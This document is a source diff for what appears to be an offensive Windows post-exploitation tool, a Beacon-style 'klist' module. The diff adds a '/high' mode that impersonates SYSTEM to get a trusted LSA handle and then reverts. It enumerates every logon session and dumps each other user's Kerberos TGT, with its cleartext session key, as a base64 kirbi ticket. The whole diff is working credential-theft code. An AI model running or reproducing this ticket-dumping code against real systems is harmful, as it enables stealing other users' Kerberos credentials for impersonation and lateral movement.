@@ -1,4 +1,8 @@
 #include "_include/functions.c"
+#ifdef DUMP
+#include "_include/asn_decode.c"
+#include "_include/asn_encode.c"
+#endif
 
 SYSTEMTIME ConvertToSystemtime(LARGE_INTEGER li) {
     FILETIME ft;
@@ -168,6 +172,189 @@ bool ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING tar
     }
     return false;
 }
+
+// Convert a KerberosTime (FILETIME-based LARGE_INTEGER, 100ns ticks since 1601-01-01)
+// into the DateTime struct used by the ASN.1 encoder.
+DateTime FileTimeToDateTime(LARGE_INTEGER li) {
+    DateTime dt = { 0 };
+    if (li.QuadPart == 0) {
+        return dt;
+    }
+    FILETIME ft;
+    ft.dwHighDateTime = li.HighPart;
+    ft.dwLowDateTime = li.LowPart;
+    SYSTEMTIME st;
+    KERNEL32$FileTimeToSystemTime(&ft, &st);
+    dt.isSet = 1;
+    dt.year = st.wYear;
+    dt.month = st.wMonth;
+    dt.day = st.wDay;
+    dt.hour = st.wHour;
+    dt.minute = st.wMinute;
+    dt.second = st.wSecond;
+    return dt;
+}
+
+// Build a single-component PrincipalName (name_type=1) from a wide UNICODE_STRING.
+void BuildPrincipalNameFromUnicode(UNICODE_STRING us, PrincipalName* pname) {
+    if (us.Length == 0 || us.Buffer == NULL) {
+        pname->name_type = 0;
+        pname->name_count = 0;
+        pname->name_string = NULL;
+        return;
+    }
+    int len = us.Length / 2;
+    char* name = MemAlloc(len + 1);
+    KERNEL32$WideCharToMultiByte(CP_ACP, 0, us.Buffer, len, name, len + 1, NULL, 0);
+    name[len] = 0;
+    pname->name_type = 1;
+    pname->name_count = 1;
+    pname->name_string = MemAlloc(sizeof(char*));
+    pname->name_string[0] = name;
+}
+
+// Build a two-component PrincipalName (name_type=2, service/instance) from two wide strings.
+void BuildPrincipalNameFromService(UNICODE_STRING service, UNICODE_STRING instance, PrincipalName* pname) {
+    pname->name_type = 2;
+    pname->name_count = 2;
+    pname->name_string = MemAlloc(sizeof(char*) * 2);
+    int sLen = service.Length / 2;
+    char* sName = MemAlloc(sLen + 1);
+    KERNEL32$WideCharToMultiByte(CP_ACP, 0, service.Buffer, sLen, sName, sLen + 1, NULL, 0);
+    sName[sLen] = 0;
+    int iLen = instance.Length / 2;
+    char* iName = MemAlloc(iLen + 1);
+    KERNEL32$WideCharToMultiByte(CP_ACP, 0, instance.Buffer, iLen, iName, iLen + 1, NULL, 0);
+    iName[iLen] = 0;
+    pname->name_string[0] = sName;
+    pname->name_string[1] = iName;
+}
+
+// Build a PrincipalName from a KERB_EXTERNAL_NAME (the name type used inside
+// KERB_EXTERNAL_TICKET). A KERB_EXTERNAL_NAME has a NameType, a NameCount, and
+// a variable-length Names[] array of UNICODE_STRING. For a TGT the service name
+// is typically "krbtgt/DOMAIN" (2 components); the client name is a single
+// component. We preserve the original name_type and all components.
+void BuildPrincipalNameFromExternalName(PKERB_EXTERNAL_NAME extName, PrincipalName* pname) {
+    if (extName == NULL || extName->NameCount == 0) {
+        pname->name_type = 0;
+        pname->name_count = 0;
+        pname->name_string = NULL;
+        return;
+    }
+    pname->name_type = extName->NameType;
+    pname->name_count = extName->NameCount;
+    pname->name_string = MemAlloc(sizeof(char*) * extName->NameCount);
+    for (ULONG i = 0; i < extName->NameCount; i++) {
+        UNICODE_STRING us = extName->Names[i];
+        int len = us.Length / 2;
+        char* name = MemAlloc(len + 1);
+        if (len > 0 && us.Buffer != NULL) {
+            KERNEL32$WideCharToMultiByte(CP_ACP, 0, us.Buffer, len, name, len + 1, NULL, 0);
+        }
+        name[len] = 0;
+        pname->name_string[i] = name;
+    }
+}
+
+// Convert a KERB_EXTERNAL_TICKET (returned by KerbRetrieveTicketMessage) into a
+// base64-encoded KRB_CRED (kirbi). This is the path that works from a high
+// integrity process when targeting a foreign LUID — LSA returns the full
+// (non-zeroed) session key because the caller LUID != target LUID.
+char* ExternalTicketToKirbi(KERB_EXTERNAL_TICKET* extTicket) {
+    KRB_CRED cred = { 0 };
+    cred.pvno = 5;
+    cred.msg_type = 22;
+    cred.ticket_count = 1;
+    cred.tickets = MemAlloc(sizeof(Ticket));
+
+    // Decode the encoded ticket (the raw Ticket ASN.1 blob) into our Ticket struct.
+    AsnElt tktAsn = { 0 };
+    if (BytesToAsnDecode3(extTicket->EncodedTicket, extTicket->EncodedTicketSize, false, &tktAsn)) return NULL;
+    if (AsnGetTicket(&(tktAsn.sub[0]), &(cred.tickets[0]))) return NULL;
+
+    KrbCredInfo info = { 0 };
+
+    // Session key — KERB_EXTERNAL_TICKET.SessionKey is a KERB_CRYPTO_KEY32.
+    // When dumped as a non-SYSTEM caller for a foreign LUID, LSA returns the
+    // cleartext key here (the trick from the klist-revisited blog).
+    info.key.key_type = extTicket->SessionKey.KeyType;
+    info.key.key_size = extTicket->SessionKey.Length;
+    info.key.key_value = MemAlloc(extTicket->SessionKey.Length);
+    MemCpy(info.key.key_value, extTicket->SessionKey.Value, extTicket->SessionKey.Length);
+
+    info.flags = extTicket->TicketFlags;
+    info.authtime = FileTimeToDateTime(extTicket->StartTime);
+    info.starttime = FileTimeToDateTime(extTicket->StartTime);
+    info.endtime = FileTimeToDateTime(extTicket->EndTime);
+    info.renew_till = FileTimeToDateTime(extTicket->RenewUntil);
+
+    // Client principal (pname) + realm (prealm)
+    BuildPrincipalNameFromExternalName(extTicket->ClientName, &info.pname);
+    int realmLen = extTicket->DomainName.Length / 2;
+    info.prealm = MemAlloc(realmLen + 1);
+    KERNEL32$WideCharToMultiByte(CP_ACP, 0, extTicket->DomainName.Buffer, realmLen, info.prealm, realmLen + 1, NULL, 0);
+    info.prealm[realmLen] = 0;
+    info.srealm = info.prealm;
+
+    // Service principal (sname) — KERB_EXTERNAL_NAME may have multiple components
+    // (e.g. krbtgt/DOMAIN). BuildPrincipalNameFromExternalName preserves them all.
+    BuildPrincipalNameFromExternalName(extTicket->ServiceName, &info.sname);
+
+    cred.enc_part.ticket_count = 1;
+    cred.enc_part.ticket_info = MemAlloc(sizeof(KrbCredInfo));
+    cred.enc_part.ticket_info[0] = info;
+
+    AsnElt asnKirbi = { 0 };
+    if (AsnKrbCredEncode(&cred, &asnKirbi)) return NULL;
+
+    int kirbiBytesSize = 0;
+    byte* kirbiBytes = NULL;
+    if (AsnToBytesEncode(&asnKirbi, &kirbiBytesSize, &kirbiBytes)) return NULL;
+
+    return base64_encode(kirbiBytes, kirbiBytesSize);
+}
+
+// Dump the primary TGT for a specific logon session using KerbRetrieveTicketMessage.
+// This is the "klist tgt -li <LUID>" path. When called from a high-integrity
+// (non-SYSTEM) process for a foreign LUID, LSA returns the full session key.
+// Returns TRUE on success and sets *outKirbi to a base64 KRB_CRED.
+bool DumpTgtForLuid(HANDLE hLsa, ULONG authPackage, LUID targetLuid, char** outKirbi) {
+    KERB_RETRIEVE_TKT_REQUEST request = { 0 };
+    request.MessageType = KerbRetrieveTicketMessage;
+    request.LogonId = targetLuid;
+
+    KERB_RETRIEVE_TKT_RESPONSE* response = NULL;
+    ULONG responseSize = 0;
+    NTSTATUS protocolStatus = 0;
+
+    NTSTATUS status = SECUR32$LsaCallAuthenticationPackage(
+        hLsa, authPackage, &request, sizeof(request),
+        &response, &responseSize, &protocolStatus);
+
+    if (status != 0) {
+        return false;
+    }
+    if (protocolStatus != 0) {
+        // 0xc0000061 = STATUS_PRIVILEGE_NOT_HELD (own LUID as non-SYSTEM, or truly needs Tcb)
+        if (protocolStatus == 0xc0000061) {
+            PRINT_OUT("[!] 0xc0000061 - privilege not held (targeting own LUID as non-SYSTEM?)\n");
+        }
+        else {
+            PRINT_OUT("[!] KerbRetrieveTicketMessage failed: 0x%08x\n", protocolStatus);
+        }
+        return false;
+    }
+    if (response == NULL || responseSize == 0) {
+        return false;
+    }
+
+    char* kirbi = ExternalTicketToKirbi(&(response->Ticket));
+    if (response) SECUR32$LsaFreeReturnBuffer(response);
+    if (kirbi == NULL) return false;
+    *outKirbi = kirbi;
+    return true;
+}
 #endif
 
 void PrintTicketInfo(KERB_TICKET_CACHE_INFO_EX cacheInfo, LUID luid) {
@@ -304,27 +491,46 @@ long int my_strtol(const char* str, char** endptr, int base) {
     return result * sign;
 }
 
-void KLIST( char* luid, char* targetService, char* targetUser, char* targetClient ) {
+void KLIST( char* luid, char* targetService, char* targetUser, char* targetClient, int highIntegrityMode ) {
     LUID   targetLuid = { 0 };
     HANDLE hToken = GetCurrentToken(TOKEN_QUERY);
     BOOL IsSystemToken = IsSystem(hToken);
     BOOL IsElevated = IsHighIntegrity();
     BOOL DidImpersonate = FALSE;
 
-    // If we're elevated but not yet SYSTEM, impersonate winlogon's SYSTEM token
-    // so we have SeTcbPrivilege for LsaRegisterLogonProcess/LsaEnumerateLogonSessions.
-    // Mirrors Rubeus' Helpers.GetSystem() approach.
-    if (IsElevated && !IsSystemToken) {
-        if (GetSystem()) {
-            IsSystemToken = TRUE;
-            DidImpersonate = TRUE;
+    // highIntegrityMode:
+    //   0 = default (auto: impersonate SYSTEM if elevated, classic KerbQueryTicketCacheEx path)
+    //   1 = /high  — stay high-integrity (non-SYSTEM), use KerbRetrieveTicketMessage
+    //                to dump TGTs for foreign LUIDs with full session keys.
+    //   2 = /system — force the classic SYSTEM impersonation path (SeTcbPrivilege).
+    if (highIntegrityMode == 1) {
+        if (!IsElevated) {
+            PRINT_OUT("[X] /high requires a high integrity (elevated) process.\n");
+            return;
         }
-        else {
-            PRINT_OUT("[!] Could not elevate to SYSTEM (GetSystem failed)\n");
+        if (IsSystemToken) {
+            PRINT_OUT("[!] /high requested but we are already SYSTEM. Use /system or no flag for the SYSTEM path.\n");
+            return;
+        }
+        PRINT_OUT("[*] High-integrity mode: dumping TGTs via KerbRetrieveTicketMessage (no SYSTEM).\n");
+        PRINT_OUT("[*] LSA returns full session keys only for foreign LUIDs in this mode.\n\n");
+    }
+    else {
+        // If we're elevated but not yet SYSTEM, impersonate winlogon's SYSTEM token
+        // so we have SeTcbPrivilege for LsaRegisterLogonProcess/LsaEnumerateLogonSessions.
+        // Mirrors Rubeus' Helpers.GetSystem() approach.
+        if (IsElevated && !IsSystemToken) {
+            if (GetSystem()) {
+                IsSystemToken = TRUE;
+                DidImpersonate = TRUE;
+            }
+            else {
+                PRINT_OUT("[!] Could not elevate to SYSTEM (GetSystem failed)\n");
+            }
         }
     }
 
-    if (!IsSystemToken && (luid || targetUser)) {
+    if (highIntegrityMode != 1 && !IsSystemToken && (luid || targetUser)) {
         PRINT_OUT("[X] You need to be in high integrity to enumerate other users' tickets.\n");
         if (DidImpersonate) ADVAPI32$RevertToSelf();
         return;
@@ -366,12 +572,140 @@ void KLIST( char* luid, char* targetService, char* targetUser, char* targetClien
         PRINT_OUT("--------------------------------------------------------------------------------------------------------------------------\n");
 #endif
 
-    HANDLE hLsa;
-    if (GetLsaHandle(hToken, IsSystemToken, &hLsa)) return;
-
     ULONG authPackage;
     LSA_STRING krbAuth = { .Buffer = "kerberos",.Length = 8,.MaximumLength = 9 };
-    if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) == 0) {
+
+#ifdef DUMP
+    // ===== High-integrity TGT dump path (KerbRetrieveTicketMessage) =====
+    // Based on https://jakeotte.com/posts/klist-revisited.html — LSA returns
+    // full (non-zeroed) session keys for foreign LUIDs from a high-integrity
+    // (non-SYSTEM) caller. We impersonate SYSTEM to establish a *trusted* LSA
+    // connection (LsaRegisterLogonProcess) and enumerate logon sessions, then
+    // revert to self so our caller LUID != each target LUID. The trusted LSA
+    // handle persists after reverting — the trust level is set at connect time.
+    if (highIntegrityMode == 1) {
+        LUID callerLuid = GetCurrentLUID(hToken);
+
+        // Temporarily impersonate SYSTEM. We need this for TWO things:
+        //   1) LsaRegisterLogonProcess (creates a trusted LSA handle)
+        //   2) LsaEnumerateLogonSessions (needs SeTcbPrivilege)
+        if (!GetSystem()) {
+            PRINT_OUT("[X] Failed to impersonate SYSTEM for session enumeration.\n");
+            return;
+        }
+
+        // Create a TRUSTED LSA handle while impersonating SYSTEM.
+        // This handle stays trusted after we revert to self.
+        HANDLE hLsa = NULL;
+        ULONG mode = 0;
+        STRING lsaString = { .Length = 8, .MaximumLength = 9, .Buffer = "Winlogon" };
+        NTSTATUS lsaStatus = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsa, &mode);
+        if (lsaStatus != 0) {
+            PRINT_OUT("[X] LsaRegisterLogonProcess failed: 0x%08x\n", lsaStatus);
+            ADVAPI32$RevertToSelf();
+            return;
+        }
+
+        if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) != 0) {
+            PRINT_OUT("[X] LsaLookupAuthenticationPackage failed.\n");
+            SECUR32$LsaDeregisterLogonProcess(hLsa);
+            ADVAPI32$RevertToSelf();
+            return;
+        }
+
+        LOGON_SESSION_DATA sessionData;
+        if (GetLogonSessionData(targetLuid, &sessionData) != 0) {
+            PRINT_OUT("[X] Failed to enumerate logon sessions.\n");
+            SECUR32$LsaDeregisterLogonProcess(hLsa);
+            ADVAPI32$RevertToSelf();
+            return;
+        }
+
+        // Revert to self (high integrity, non-SYSTEM) so LSA sees a foreign
+        // caller LUID when we query each session's TGT. The trusted LSA handle
+        // from LsaRegisterLogonProcess remains valid and usable.
+        ADVAPI32$RevertToSelf();
+
+        // Enable SeImpersonatePrivilege (29) and SeTcbPrivilege (7) on the
+        // current process token, mirroring klist.exe's RtlAdjustPrivilege calls.
+        // These may be present-but-disabled in the high-integrity token.
+        EnablePrivilege(29, TRUE);  // SeImpersonatePrivilege
+        EnablePrivilege(7, TRUE);   // SeTcbPrivilege (may not be present, ignore failure)
+
+        int dumped = 0;
+        for (int i = 0; i < sessionData.sessionCount; i++) {
+            if (sessionData.sessionData[i] == NULL)
+                    continue;
+
+                LUID sessLuid = sessionData.sessionData[i]->LogonId;
+
+                // Skip our own LUID — LSA zeroes the key for same-LUID non-SYSTEM callers.
+                if (sessLuid.LowPart == callerLuid.LowPart && sessLuid.HighPart == callerLuid.HighPart) {
+#ifndef TRIAGE
+                    PRINT_OUT("[*] Skipping own LUID 0x%x:0x%x (key would be zeroed in /high mode)\n",
+                        sessLuid.HighPart, sessLuid.LowPart);
+#endif
+                    SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
+                    continue;
+                }
+
+                // If a specific LUID was requested, skip non-matches.
+                if (targetLuid.LowPart != 0 &&
+                    (sessLuid.LowPart != targetLuid.LowPart)) {
+                    SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
+                    continue;
+                }
+
+#ifndef TRIAGE
+                char* username = MemAlloc((*sessionData.sessionData[i]).UserName.Length / 2 + 1);
+                KERNEL32$WideCharToMultiByte(CP_ACP, 0, (*sessionData.sessionData[i]).UserName.Buffer,
+                    (*sessionData.sessionData[i]).UserName.Length / 2, username,
+                    (*sessionData.sessionData[i]).UserName.Length / 2 + 1, NULL, 0);
+                char* domain = MemAlloc((*sessionData.sessionData[i]).LogonDomain.Length / 2 + 1);
+                KERNEL32$WideCharToMultiByte(CP_ACP, 0, (*sessionData.sessionData[i]).LogonDomain.Buffer,
+                    (*sessionData.sessionData[i]).LogonDomain.Length / 2, domain,
+                    (*sessionData.sessionData[i]).LogonDomain.Length / 2 + 1, NULL, 0);
+
+                PRINT_OUT("[*] LUID 0x%x:0x%x  %s\\%s\n", sessLuid.HighPart, sessLuid.LowPart, domain, username);
+#endif
+
+                // Optional /user filter
+                if (targetUser) {
+                    int usernameLength = (*sessionData.sessionData[i]).UserName.Length / 2;
+                    char* username = MemAlloc(usernameLength + 1);
+                    KERNEL32$WideCharToMultiByte(CP_ACP, 0, (*sessionData.sessionData[i]).UserName.Buffer,
+                        usernameLength, username, usernameLength + 1, NULL, 0);
+                    StrToLower(username);
+                    StrToLower(targetUser);
+                    if (my_strncmp(targetUser, username, my_strlen(targetUser) + 1) != 0) {
+                        SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
+                        continue;
+                    }
+                }
+
+                char* kirbi = NULL;
+                if (DumpTgtForLuid(hLsa, authPackage, sessLuid, &kirbi)) {
+                    PRINT_OUT("[*] TGT (kirbi):\n\t%s\n\n", kirbi);
+                    dumped++;
+                }
+                else {
+                    PRINT_OUT("[!] No TGT for LUID 0x%x:0x%x (session may have no TGT)\n\n",
+                        sessLuid.HighPart, sessLuid.LowPart);
+                }
+                SECUR32$LsaFreeReturnBuffer(sessionData.sessionData[i]);
+            }
+
+            PRINT_OUT("[*] Dumped %d TGT(s) via high-integrity path.\n", dumped);
+            SECUR32$LsaDeregisterLogonProcess(hLsa);
+            return;
+        }
+#endif // DUMP
+
+        // ===== Classic path (default / /system) =====
+        HANDLE hLsa;
+        if (GetLsaHandle(hToken, IsSystemToken, &hLsa)) return;
+
+        if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) == 0) {
 
         LOGON_SESSION_DATA sessionData;
         if (GetLogonSessionData(targetLuid, &sessionData) == 0) {
@@ -461,7 +795,7 @@ void KLIST( char* luid, char* targetService, char* targetUser, char* targetClien
                 SECUR32$LsaFreeReturnBuffer(cacheResponse);
             }
         }
-    }
+        }
 #ifdef TRIAGE
         PRINT_OUT("--------------------------------------------------------------------------------------------------------------------------\n");
 #endif
@@ -476,18 +810,23 @@ void KLIST_RUN( PCHAR Buffer, IN DWORD Length ) {
     char* targetUser = NULL;
     char* targetService = NULL;
     char* targetClient = NULL;
+    BOOL bHigh = FALSE;
+    BOOL bSystem = FALSE;
 
     for (int i = 0; i < Length; i++) {
         i += GetStrParam(Buffer + i, Length - i, "/luid:", 6, &luid );
         i += GetStrParam(Buffer + i, Length - i, "/user:", 6, &targetUser );
         i += GetStrParam(Buffer + i, Length - i, "/service:", 9, &targetService );
         i += GetStrParam(Buffer + i, Length - i, "/client:", 8, &targetClient );
+        i += IsSetParam(Buffer + i, Length - i, "/high", 5, &bHigh );
+        i += IsSetParam(Buffer + i, Length - i, "/system", 7, &bSystem );
     }
-#ifdef TRIAGE
-    KLIST(luid, targetService, targetUser, targetClient);
-#else
-    KLIST(luid, targetService, targetUser, targetClient);
-#endif
+
+    int highIntegrityMode = 0;
+    if (bHigh) highIntegrityMode = 1;
+    else if (bSystem) highIntegrityMode = 2;
+
+    KLIST(luid, targetService, targetUser, targetClient, highIntegrityMode);
 }
 
 VOID go( IN PCHAR Buffer, IN ULONG Length ) {
